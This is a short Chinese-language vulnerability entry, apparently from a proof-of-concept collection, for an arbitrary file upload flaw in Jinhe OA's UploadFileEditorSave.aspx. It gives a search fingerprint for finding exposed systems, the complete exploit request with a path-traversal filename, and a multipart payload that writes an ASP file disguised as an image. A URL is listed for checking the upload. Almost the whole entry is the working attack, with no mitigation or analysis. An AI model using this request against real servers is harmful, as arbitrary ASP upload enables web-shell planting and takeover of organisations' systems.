# 金和Control任意文件上传漏洞

- **系统**：金和OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /C6/Control/UploadFileEditorSave.aspx?filename=\....\....\C6\du1w7idk.asp HTTP/1.1`
- **关键头**：`Content-Length: 216`　`Content-Type: multipart/form-data; boundary=----9fh1lo9qobtszaiahg6v`

**请求体 / payload**
```
------9fh1lo9qobtszaiahg6v
Content-Disposition: form-data; name="file"; filename="du1w7idk.jpg"
Content-Type: image/png
<% response.write("nvtixjy92l1nmlw8dlwektqn3628tx1x")
%>
------9fh1lo9qobtszaiahg6v--
http://ip/C6/du1w7idk.asp
```